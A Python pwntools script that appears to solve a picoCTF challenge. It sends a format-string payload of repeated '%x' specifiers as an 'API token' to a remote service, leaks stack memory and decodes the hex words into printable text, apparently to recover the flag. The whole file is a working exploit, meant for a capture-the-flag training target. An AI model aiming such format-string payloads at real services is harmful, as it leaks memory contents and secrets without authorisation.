# import pwntools
from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 53437)

# get to vulnerability
r.recvuntil(b"View my")
r.send(b"1\n")
r.recvuntil(b"What is your API token?\n")

# send string to print stack
r.send(bytes("%x" + "-%x"*40 + "\n","latin-1"))

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()

# remove unwanted components
x = x[:-1].decode()

# parse to characters
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)
